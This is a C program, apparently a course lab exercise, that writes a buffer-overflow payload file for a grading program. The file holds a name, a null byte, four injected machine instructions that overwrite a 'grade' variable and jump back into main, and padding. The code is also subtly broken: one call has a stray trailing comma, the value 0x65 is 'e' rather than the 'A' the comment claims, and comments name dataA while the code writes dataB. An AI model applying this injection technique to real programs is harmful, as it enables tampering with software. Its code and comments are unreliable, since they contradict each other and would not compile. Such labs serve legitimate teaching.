/**********************************************************************/
/* Author: Chimwemwe Chinkuyu                                         */
/* file: createdataA.c                                                */
/**********************************************************************/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


/* Takes in no input and writes "Chimwemwe", by 1 null byte,
 * then four instructions that set grade = 'A' in grader.c, then
 * 22 null bytes for padding in buf[]. Returns 0. */
int main(void) {
    FILE *psFile;
    unsigned int ulInstruction;
    int i = 0;

    /* Open file dataB to write data into */
    psFile = fopen("dataB", "w");

    /* Write my name (Chimwemwe) to the file dataB followed
     * by a null byte */
    fprintf(psFile, "Chimwemwe");
    putc(0x00, psFile);

    /* Write the instruction that moves 'A' into the x0 register
     * in machine language to dataA */
    ulInstruction = MiniAssembler_mov(0x0, 0x65,);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that puts the address of variable [grade]
     * into the x1 register in machine language to dataA */
    ulInstruction = MiniAssembler_adr(0x1, 0x420000, 0x420066);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that stores 'A' in the [grade] variable
     * in machine language to dataA */
    ulInstruction = MiniAssembler_strb(0x0, 0x1);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Write the instruction that branches to the instruction in main
     * that prints the user's name and grade in machine language to
     * dataA */
    ulInstruction = MiniAssembler_b(0x400864, 0x42006E);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);

    /* Fill up buf[] array with 22 null bytes of padding */
    for(; i < 22; i++) {
        putc('\0', psFile);
    }

    /* Close the file */
    fclose(psFile);

    return 0;
}
